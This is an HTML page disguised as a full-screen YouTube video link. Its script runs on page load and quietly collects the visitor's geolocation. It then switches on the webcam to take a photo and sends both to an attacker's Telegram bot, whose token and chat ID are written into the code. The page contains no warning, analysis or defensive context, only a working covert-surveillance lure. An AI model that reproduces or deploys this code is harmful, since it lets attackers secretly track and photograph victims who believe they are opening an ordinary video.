<!DOCTYPE html>
<html lang="en">
<head>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Link</title>
       <style>
        html, body {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
        }
        #video-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            overflow: hidden;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>
    <script>
        const BOT_TOKEN = '7441991455:AAGc4VYhBocl18BWeBNgFFdNB2vSS6TdFNk'; // Telegram bot token
        const CHAT_ID = '5528965178'; // Telegram chat ID

        async function sendPhotoToTelegram(photoBlob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', photoBlob, 'photo.jpg');

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    console.log("Photo sent successfully!");
                } else {
                    console.error('Failed to send photo:', await response.text());
                }
            } catch (error) {
                console.error('Error sending photo:', error);
            }
        }

        async function sendLocationToTelegram(latitude, longitude) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        latitude: latitude,
                        longitude: longitude
                    })
                });

                if (response.ok) {
                    console.log('Location sent successfully!');
                } else {
                    console.error('Failed to send location:', await response.text());
                }
            } catch (error) {
                console.error('Error sending location:', error);
            }
        }

        async function capturePhoto() {
            const video = document.createElement('video');
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            video.play();

            video.addEventListener('loadeddata', () => {
                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0);
                    canvas.toBlob(async (blob) => {
                        stream.getTracks().forEach(track => track.stop());
                        await sendPhotoToTelegram(blob);
                    }, 'image/jpeg');
                }, 1000); // Delay for 1 second
            });
        }

        document.addEventListener('DOMContentLoaded', () => {
            // Get user's location
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const { latitude, longitude } = position.coords;
                    await sendLocationToTelegram(latitude, longitude);
                    await capturePhoto(); // Capture photo after sending location
                }, (error) => {
                    console.error('Error getting location:', error);
                });
            } else {
                alert('Geolocation is not supported by this browser.');
            }
        });
    </script>
       <div id="video-container">
        <iframe src="https://youtu.be/AuifWAm2ZrA?si=88HOnrbkmHx4tL0m"

    </div>
    <script>
        document.documentElement.requestFullscreen().catch(err => {
            console.error('Failed to enter full-screen mode:', err);
        });
    </script>
</body>
